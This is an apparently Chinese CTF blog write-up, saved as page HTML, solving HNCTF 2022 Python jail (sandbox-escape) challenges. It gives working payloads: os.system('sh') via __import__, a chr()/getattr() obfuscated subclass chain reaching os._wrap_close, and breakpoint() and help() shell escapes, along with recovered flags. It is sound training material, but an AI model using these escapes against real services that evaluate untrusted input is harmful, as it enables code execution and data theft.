@@ -1,0 +1,490 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>初识沙箱逃逸 | w3nx1z1</title><meta name="author" content="w3nx1z1"><meta name="copyright" content="w3nx1z1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="初识沙箱逃逸[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)给了源码 #Your goal is to read .&#x2F;flag.txt #You can use these payload liked &#96;__import__(&#39;os&#39;).system(&#39;cat .&#x2F;flag.txt&#39;)&#96; or &#96;print(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识沙箱逃逸">
+<meta property="og:url" content="http://w3nx1z1.github.io/posts/235901d1.html">
+<meta property="og:site_name" content="w3nx1z1">
+<meta property="og:description" content="初识沙箱逃逸[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)给了源码 #Your goal is to read .&#x2F;flag.txt #You can use these payload liked &#96;__import__(&#39;os&#39;).system(&#39;cat .&#x2F;flag.txt&#39;)&#96; or &#96;print(">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://w3nx1z1.github.io/img/mikey.png">
+<meta property="article:published_time" content="2023-08-05T14:14:56.171Z">
+<meta property="article:modified_time" content="2025-02-14T08:30:17.439Z">
+<meta property="article:author" content="w3nx1z1">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="沙箱逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w3nx1z1.github.io/img/mikey.png"><link rel="shortcut icon" href="/img/%E8%87%AA%E7%94%B1%E4%B9%8B%E7%BF%BC.jpg"><link rel="canonical" href="http://w3nx1z1.github.io/posts/235901d1.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '初识沙箱逃逸',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-02-14 16:30:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="\themes\butterfly\source\css\custom.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="w3nx1z1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mikey.png" onerror="onerror=null;src='/img/404.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/baobao.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="w3nx1z1"><span class="site-name">w3nx1z1</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">初识沙箱逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-05T14:14:56.171Z" title="发表于 2023-08-05 22:14:56">2023-08-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-14T08:30:17.439Z" title="更新于 2025-02-14 16:30:17">2025-02-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="初识沙箱逃逸"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="初识沙箱逃逸"><a href="#初识沙箱逃逸" class="headerlink" title="初识沙箱逃逸"></a>初识沙箱逃逸</h1><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-沙箱逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)</h2><p>给了源码</p>
+<pre><code class="python">#Your goal is to read ./flag.txt
+#You can use these payload liked `__import__(&#39;os&#39;).system(&#39;cat ./flag.txt&#39;)` or `print(open(&#39;/flag.txt&#39;).read())`
+
+WELCOME = &#39;&#39;&#39;
+  _     ______      _                              _       _ _ 
+ | |   |  ____|    (_)                            | |     (_) |
+ | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
+ | &#39;_ \|  __| / _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|  _   | |/ _` | | |
+ | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
+ |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
+               __/ |                                           
+              |___/                                            
+&#39;&#39;&#39;
+
+print(WELCOME)
+
+print(&quot;Welcome to the python jail&quot;)
+print(&quot;Let&#39;s have an beginner jail of calc&quot;)
+print(&quot;Enter your expression and I will evaluate it for you.&quot;)
+input_data = input(&quot;&gt; &quot;)
+print(&#39;Answer: &#123;&#125;&#39;.format(eval(input_data)))
+</code></pre>
+<p>什么也没有过滤 并且给了提示 可以使用上面两种payload  </p>
+<p>这里尝试使用交互式操作 </p>
+<pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)
+</code></pre>
+<p>解释一下</p>
+<pre><code>__import__(&#39;os&#39;)：这是一个使用内置函数 __import__ 来导入 Python 模块 os 的代码。os 模块提供了与操作系统交互的功能，例如执行系统命令、文件操作等。
+
+os.system(&#39;sh&#39;)：在导入了 os 模块后，该代码执行了 os.system(&#39;sh&#39;)。os.system() 函数是用于执行系统命令的，它接受一个字符串参数，将其中的命令在终端或命令提示符中执行。在这里，它试图执行命令 sh。
+
+sh 是一个常用的 Unix/Linux 命令行解释器（shell），它是命令行的一个交互式解释器，允许用户输入命令并执行。
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220144872.png" alt="image-20230730220144872"></p>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-沙箱逃逸-chr-SSTI注入" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)</h2><p>也是给出了源码 但是在其中绕过了单引号、双引号、反斜杠、反引号和i、b两个字母</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230730220420343.png" alt="image-20230730220420343"></p>
+<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>下面使用一种方法：<code>python模板注入</code> 简称<code>SSTI</code></p>
+<p>python中的元组、列表、字典、字符串等都是对象 可以用过<code>__class__</code>这个函数来进行查看  可以看到父类是<code>object</code> 可以说任何类的父类都是<code>object</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163225243.png" alt="image-20230731163225243"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163235565.png" alt="image-20230731163235565"></p>
+<p><code>__base__</code>是返回这个对象所属类的父类 <code>__mro__</code>是以元组的形式返回与该对象所属类相关的所有类 <code>__bases__</code>是以元组的形式返回这个对象</p>
+<p>所属类的父类</p>
+<p><code>__subclasses__()</code> <font color='red'>别丢括号</font>这个函数会返回当前吗父类下的所有子类 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163859985.png" alt="image-20230731163859985"></p>
+<p>因此我们可以利用这个函数 查看object类的所有子类 从中找到我们可以利用的类来进行rce(远程命令执行) 当我们想使用具体的类的时候 加上查询结果中对应的下标索引就好</p>
+<p>但是在这题中字母<code>b</code>是被ban掉的 因此我们可以使用getattr()和chr()两个函数来进行拼接和执行函数</p>
+<p>学习一下getsttr()函数：</p>
+<p>描述：</p>
+<p>getsttr()用于返回一个对象属性值</p>
+<p>参数：</p>
+<pre><code>getattr(object, name[, default])
+</code></pre>
+<p>参数：</p>
+<ul>
+<li>object – 对象。</li>
+<li>name – 字符串，对象属性。</li>
+<li>default – 默认返回值，如果不提供该参数，在没有对应属性时，将触发 AttributeError。</li>
+</ul>
+<p>我们可以使用chr(hex)替换掉被ban掉的字母 这样就可以组成我们需要的函数 getattr()函数可以帮助我们实现运行使用chr()替换的函数</p>
+<p>下面是对于<code>().__class__.__base__.__subclasses__()</code> 使用chr()和getattr()函数的渐变过程</p>
+<p>注意在转化的时候 单引号需要进行省略</p>
+<pre><code>getattr(().__class__, &#39;__base__&#39;).__subclasses__()
+
+getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()
+
+getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), &#39;__subclasses__&#39;)()
+
+getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()
+</code></pre>
+<p>我们尝试在题目环境中输入这段命令 查看返回的object父类中包含的所有子类</p>
+<pre><code>Answer: [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;symtable entry&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;types.GenericAlias&#39;&gt;, &lt;class &#39;anext_awaitable&#39;&gt;, &lt;class &#39;async_generator_asend&#39;&gt;, &lt;class &#39;async_generator_athrow&#39;&gt;, &lt;class &#39;async_generator_wrapped_value&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;weakref.CallableProxyType&#39;&gt;, &lt;class &#39;weakref.ProxyType&#39;&gt;, &lt;class &#39;weakref.ReferenceType&#39;&gt;, &lt;class &#39;types.UnionType&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;_contextvars.Context&#39;&gt;, &lt;class &#39;_contextvars.ContextVar&#39;&gt;, &lt;class &#39;_contextvars.Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc._abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;]
+</code></pre>
+<p>在下标索引为<code>-4</code>的位置看到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code> 可以构造payload</p>
+<pre><code class="python">().__class__.__base__.__subclasses__()[-4].__init__.__global__[&#39;sysytem&#39;](&#39;sh&#39;)
+</code></pre>
+<p>整体转换一下</p>
+<pre><code>getattr(getattr(getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4], chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)), chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))
+</code></pre>
+<p>进入sh交互模式 找到flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731172455253.png" alt="image-20230731172455253"></p>
+<p><strong>NSSCTF{aeb2432a-8fdd-4c36-81d6-8a60bf3d8212}</strong></p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><code>__builtins__</code>模块用于查看python内部的内置变量和内置函数</p>
+<p><code>__builtins__</code>是对<code>builtins</code>的引用 在任何地方使用<code>builtins</code>都必须import 但是使用<code>__builtins__</code>不需要使用import </p>
+<p>写出payload</p>
+<pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;cat flag&#39;)
+</code></pre>
+<p>调用了os模块的system函数(用于在操作系统的 shell 中执行命令。它接收一个字符串参数 <code>command</code>，表示要执行的系统命令，然后将该命令传递给操作系统的 shell 进行执行) 执行<code>cat flag</code>命令 直接读取flag文件的值</p>
+<p>在这之前还要通过input()函数 输入上述payload 因为环境ban掉了字母<code>i</code> 因此我们还是使用chr()函数 替换掉input()函数</p>
+<pre><code class="python">eval(chr(0x65)+chr(0x78)+chr(0x65)+chr(0x63)+chr(0x28)+chr(0x69)+chr(0x6e)+chr(0x70)+chr(0x75)+chr(0x74)+chr(0x28)+chr(0x29)+chr(0x29))
+# eval(exec(input()))
+&#39;&#39;&#39;
+exec()的作用
+动态执行代码：exec() 允许在程序运行时根据需要执行动态生成的 Python 代码。这对于动态创建函数、类、变量等非常有用。
+
+动态导入模块：使用 exec() 可以实现在运行时动态导入模块，而不是在代码中固定导入。
+
+执行用户输入的代码：exec() 可以用于执行用户输入的 Python 代码，允许在程序运行时根据用户的输入执行相应的操作。
+
+脚本执行：有时候，你可能希望从文件或网络获取一段 Python 代码，并在程序中执行它。exec() 允许你动态地执行从外部来源获取的代码。
+&#39;&#39;&#39;
+</code></pre>
+<p>当然这个payload的前提是 知道flag文件的位置和名字 </p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>同样 在知道flag的位置和名字的时候 我们可以直接open并read到flag</p>
+<pre><code>open(chr(102)+chr(108)+chr(97)+chr(103)).read()
+# open(&#39;flag&#39;).read()
+</code></pre>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)</h2><p>这一关是限制了输入命令的长度为13个字符 13个字符 正好<code>eval(input())</code></p>
+<p>这样我们在想输入什么命令就没有限制了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731201557462.png" alt="image-20230731201557462"></p>
+<p><strong>NSSCTF{c6bdf2aa-f85f-49cf-ac71-b892ad007a47}</strong></p>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())</h2><p>这次是直接限制了<code>exec eval input</code>  同时payload的长度限制在了13位</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731202239224.png" alt="image-20230731202239224"></p>
+<p>这里使用一个叫做breakpoint()的函数  可以进入一个Pdb交互界面</p>
+<pre><code>pdb 模块定义了一个交互式源代码调试器，用于Python 程序。 它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意Python 代码。 它还支持事后调试，可以在程序控制下调用。 调试器是可扩展的——调试器实际被定义为 Pdb 类。
+</code></pre>
+<p> 之后在输入<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>就可以进入shell了</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731203228696.png" alt="image-20230731203228696"></p>
+<p>得到flag：<strong>NSSCTF{69432ccf-eb26-4236-a1f0-a78b02a8ae71}</strong></p>
+<h2 id="HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())</h2><p>这关相比level2 限制的字数更少 payload不能超过7个字符</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731204432274.png" alt="image-20230731204432274"></p>
+<p>这边是使用help()函数进行rce</p>
+<p>输入help()之后也会进入一个交互界面 </p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213412627.png" alt="image-20230731213412627"></p>
+<p>按照上面提到的方式 先输入<code>modules</code> 查看所有的模块 随便选一个输入  比如看到的<code>os</code></p>
+<pre><code>modules
+os
+!ls
+!cat flag
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213810206.png" alt="image-20230731213810206"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213823579.png" alt="image-20230731213823579"></p>
